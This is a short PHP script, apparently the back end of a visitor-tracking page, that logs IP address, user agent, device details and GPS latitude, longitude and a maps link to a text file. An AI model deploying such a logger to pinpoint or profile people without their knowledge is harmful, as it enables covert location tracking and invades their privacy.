<?php
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$waktu = date("Y-m-d H:i:s");

$input = json_decode(file_get_contents('php://input'), true);

// Filter semua input agar aman
$screen    = htmlspecialchars($input['screen'] ?? 'unknown');
$timezone  = htmlspecialchars($input['timezone'] ?? 'unknown');
$language  = htmlspecialchars($input['language'] ?? 'unknown');
$platform  = htmlspecialchars($input['platform'] ?? 'unknown');
$latitude  = htmlspecialchars($input['latitude'] ?? 'unknown');
$longitude = htmlspecialchars($input['longitude'] ?? 'unknown');
$maps_url  = htmlspecialchars($input['maps_url'] ?? 'Tidak tersedia');

$log = <<<EOL
$waktu
IP        : $ip
UA        : $userAgent
OS        : $platform
Screen    : $screen
Timezone  : $timezone
Lang      : $language
Lat       : $latitude
Lon       : $longitude
Maps Link : $maps_url
--------------------------

EOL;

file_put_contents("simpan.txt", $log, FILE_APPEND);
